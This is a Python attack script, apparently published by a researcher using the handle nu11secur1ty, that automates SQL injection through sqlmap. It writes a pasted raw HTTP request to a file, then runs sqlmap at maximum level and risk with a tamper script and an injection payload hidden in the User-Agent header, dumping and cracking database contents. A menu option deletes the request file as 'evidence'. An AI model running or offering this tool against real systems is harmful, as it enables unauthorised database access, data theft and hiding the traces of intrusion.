#!/usr/bin/env python3
# nu11secur1ty 2023–2025

import os
import sys
import time
from colorama import init, Fore, Style

init(autoreset=True)

def create_exploit_file():
    # --- IMPORTANT ---
    # Paste your complete raw HTTP POST request here,
    # including method, headers, a blank line, and body exactly as needed.
    # Example:
    # POST /vulnerable/path HTTP/1.1
    # Host: target.com
    # Content-Type: application/x-www-form-urlencoded
    #
    # param1=value1&param2=value2
    payload = """Your_POST_Request_here!"""

    if payload.strip() == "" or payload.strip() == "Your_POST_Request_here!":
        print(Fore.RED + "❌ ERROR: You must replace the placeholder payload with your actual POST or GET request before running.")
        sys.exit(1)

    try:
        with open("exploit.txt", "w") as f:
            f.write(payload)
        print(Fore.CYAN + "✅ PoC exploit written to 'exploit.txt'")
    except Exception as e:
        print(Fore.RED + f"❌ Error writing file: {e}")
        sys.exit(1)

def run_sqlmap():
    print(Fore.GREEN + "\nEnter the parameter to target for SQL injection (e.g., username, id):")
    param = input(Fore.RED + "> ").strip()
    if not param:
        print(Fore.YELLOW + "⚠️ No parameter provided. Returning to menu.")
        return

    sqlmap_path = 'D:\\CVE\\sqlmap-nu11secur1ty\\sqlmap.py'  # Change if needed
    exploit_file = os.path.abspath("exploit.txt")

    cmd = (
        f'python "{sqlmap_path}" -r "{exploit_file}" -p "{param}" '
        '--tamper=space2comment '
        '--user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
        '(KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.3697127327\' or 9527=9527--" '
        '--dbms=mysql --time-sec=7 --random-agent --level=5 --risk=3 '
        '--batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump'
    )

    print(Fore.MAGENTA + "\n🚀 Launching sqlmap...\n")
    os.system(cmd)

def clean_up():
    try:
        os.remove("exploit.txt")
        print(Fore.CYAN + "🧹 'exploit.txt' has been deleted.")
    except FileNotFoundError:
        print(Fore.YELLOW + "⚠️ Nothing to clean — file already deleted.")
    except Exception as e:
        print(Fore.RED + f"❌ Failed to delete file: {e}")

def run_module(path):
    if os.path.exists(path):
        os.system(f"python {path}")
    else:
        print(Fore.YELLOW + f"⚠️ Module not found: {path}")

def display_menu():
    print(Fore.BLUE + "\n===== G0BurpSQLmaPI Menu =====" + Style.RESET_ALL)
    print(Fore.GREEN + "1. Generate PoC exploit.txt")
    print("2. Start SQLi with sqlmap")
    print("3. Start G0BurpSQLmaPIURLi (module)")
    print("3.1 Start G0BurpSQLmaPIUser-Agent (module)")
    print("4. Clean evidence (delete exploit.txt)")
    print("5. Exit" + Style.RESET_ALL)

def main():
    try:
        while True:
            display_menu()
            choice = input(Fore.YELLOW + "\nEnter your choice: ").strip()

            if choice == '1':
                create_exploit_file()
            elif choice == '2':
                run_sqlmap()
            elif choice == '3':
                run_module("modules/URLi.py")
            elif choice == '3.1':
                run_module("modules/User-Agent.py")
            elif choice == '4':
                clean_up()
            elif choice == '5':
                print(Fore.GREEN + "Exiting... Happy hunting ☠️\n")
                break
            else:
                print(Fore.RED + "❌ Invalid choice. Try again.")
            time.sleep(1)

    except KeyboardInterrupt:
        print(Fore.RED + "\nInterrupted. Exiting cleanly.")
        sys.exit(0)

if __name__ == "__main__":
    main()
